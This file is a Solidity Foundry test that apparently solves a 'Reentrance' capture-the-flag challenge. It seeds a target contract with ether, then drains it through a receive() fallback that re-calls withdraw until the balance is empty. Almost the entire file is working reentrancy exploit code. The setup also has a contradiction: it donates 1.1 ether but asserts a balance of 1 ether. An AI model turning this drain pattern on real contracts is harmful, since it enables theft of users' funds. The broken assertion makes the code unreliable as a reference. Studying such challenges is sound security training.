// SPDX-License-Identifier: MIT
pragma experimental ABIEncoderV2;
pragma solidity ^0.6.12;

import "forge-std/Test.sol";
import "../contracts/10Reentrance.sol";

contract ReentranceAttack is Test{
    Reentrance private challengeContract;
    address user = address(1234);
    address owner = address(5678);
    uint256 public constant initialDeposit = .2 ether;


    constructor () public {
        vm.deal(user, 1 ether);
        vm.deal(owner, 1.1 ether);
        challengeContract = new Reentrance();
        vm.prank(owner);
        // simulate challenge
        challengeContract.donate{value: 1.1 ether}(owner);
        assertEq(address(challengeContract).balance, 1 ether);
    }

    function testAttack () public {
        
        uint256 initialBal = address(this).balance;
        // donate initially
        vm.prank(user);
        challengeContract.donate{value: initialDeposit}(address(this));
        callWithdraw();
        assertGt(address(this).balance, initialBal);

    }

    function callWithdraw() private {
        uint256 balanceLeft = address(challengeContract).balance;
        // ^^ this balance correctly updates after each itter
        bool keepRecursing = balanceLeft > 0;

        if (keepRecursing){
            uint256 toWithdraw = initialDeposit < balanceLeft
                ? initialDeposit
                : balanceLeft;
            challengeContract.withdraw(toWithdraw);
        }
    }

    // on line 21 of the target contract this contract is called
    receive() external payable {
        console2.log("withdraw was called");
        callWithdraw();
    }

}